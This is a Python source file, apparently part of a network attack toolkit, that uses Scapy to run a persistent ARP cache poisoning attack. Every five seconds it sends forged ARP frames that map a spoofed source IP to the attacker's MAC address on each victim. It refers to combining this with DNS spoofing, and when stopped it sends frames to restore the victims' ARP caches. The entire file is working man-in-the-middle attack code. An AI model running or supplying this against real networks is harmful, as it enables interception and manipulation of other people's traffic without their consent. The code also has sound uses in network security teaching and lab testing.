#!/usr/bin/env python3

"""arppoisoning.py: Implementation of a persistent ARP cache poisoning attack."""

import time #Used to sleep
from scapy.all import * #Import scapy
import settings
from networkreconnaissance import * #Import modules from own networkreconnaissance.py file
from safeoperations import * #Import thread safe operations

#Execute persistant ARP poisoning of specified victims
def executePersistentPoisoningARP(iface, attackTuples, alsoDNS):
    sprint(settings.printMutex, '\nInitiating persistent ARP poisoning of the selected victim(s).\nPress Ctrl+C to stop the attack.')

    ownMAC = getMAC(iface)

    while True:
        try:
            for attackTuple in attackTuples:
                arpFrame = Ether(dst=attackTuple['VMAC'], src=ownMAC)/ARP(op="who-has", psrc=attackTuple['SIP'], 
                    pdst=attackTuple['VIP'], hwsrc=ownMAC)
                sendp(arpFrame, iface=iface, verbose=0)

                #Safely print in case we are also performing DNS Spoofing
                if alsoDNS:
                    sprint(settings.printMutex, 'Sent to ' + attackTuple['VIP'] + ': ' + arpFrame.summary())
                else:
                    print('Sent to ' + attackTuple['VIP'] + ': ' + arpFrame.summary())
            #Newline for formatting
            print()

            time.sleep(5)
        except KeyboardInterrupt:
            #Safely print in case we are also performing DNS Spoofing
            if alsoDNS:
                sprint(settings.printMutex, '\nYou quit the ARP Cache Poisoning attack.\nRe-arping where possible...')
            else:
                print('\nYou quit the ARP Cache Poisoning attack.')
                print('Re-arping where possible...')

            for attackTuple in attackTuples:
                if attackTuple['SMAC']:
	                arpFrame = Ether(dst=attackTuple['VMAC'], src=attackTuple['SMAC'])/ARP(op="who-has", psrc=attackTuple['SIP'], 
	                    pdst=attackTuple['VIP'], hwsrc=attackTuple['SMAC'])
	                sendp(arpFrame, iface=iface, verbose=0)

	                #Safely print in case we are also performing DNS Spoofing
	                if alsoDNS:
	                    sprint(settings.printMutex, 'Re-arped ' + attackTuple['VIP'])
	                else:
	                    print('Re-arped ' + attackTuple['VIP'])
            return